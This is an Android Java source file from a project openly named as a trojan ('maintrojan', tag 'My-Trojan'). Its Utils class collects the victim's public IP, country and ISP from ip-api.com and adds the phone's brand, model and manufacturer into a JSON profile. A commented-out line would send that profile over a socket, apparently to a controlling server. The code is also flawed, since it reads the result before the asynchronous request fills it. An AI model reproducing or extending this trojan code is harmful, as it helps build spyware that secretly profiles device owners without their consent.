package com.example.maintrojan;



import android.os.Build;
import android.util.Log;

import androidx.annotation.NonNull;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;

import io.socket.client.Socket;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class Utils {
    private static String TAG = "My-Trojan";
    private JSONObject info = null;
//    Socket sock = Connecting.getSock();


    public String sendInfo(){
        if(info == null){
            OkHttpClient client = new OkHttpClient();
            Request request = new Request.Builder()
                    .url("http://ip-api.com/json/")
                    .build();
            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(@NonNull Call call, @NonNull IOException e) {
                    e.printStackTrace();
                }

                @Override
                public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
//                Log.d(TAG, "onResponse: "+response.code());
                    if(response.isSuccessful()){
                        try {
                            info = new JSONObject();
                            JSONObject data = new JSONObject(response.body().string());
                            info.put("Country",data.getString("country"));
                            info.put("ISP",data.getString("isp"));
                            info.put("IP",data.getString("query"));
                            info.put("Brand", Build.BRAND);
                            info.put("Model", Build.MODEL);
                            info.put("Manufacture", Build.MANUFACTURER);
//                        Log.d(TAG, "onResponse: "+info.toString());
//                            sock.emit("info",info.toString());
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }
                }
            });
        }
        return info.toString();
    }

}
